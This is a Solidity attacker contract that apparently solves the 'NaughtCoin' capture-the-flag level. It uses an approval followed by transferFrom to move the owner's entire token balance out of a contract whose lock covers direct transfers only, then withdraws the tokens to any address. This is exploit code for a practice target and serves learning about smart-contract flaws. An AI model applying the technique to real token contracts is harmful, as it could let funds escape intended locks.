// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "./NaughtCoin.sol";
import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";

contract NaughtCoinAttacker is Ownable(msg.sender) {
    NaughtCoin target;

    constructor(address _target) {
        target = NaughtCoin(_target);
    }

    function attack() public onlyOwner {
        // need to approve first

        target.transferFrom(owner(), address(this), target.balanceOf(address(owner())));
    }

    function withdraw(address _to) public onlyOwner {
        target.transfer(_to, target.balanceOf(address(this)));
    }
}
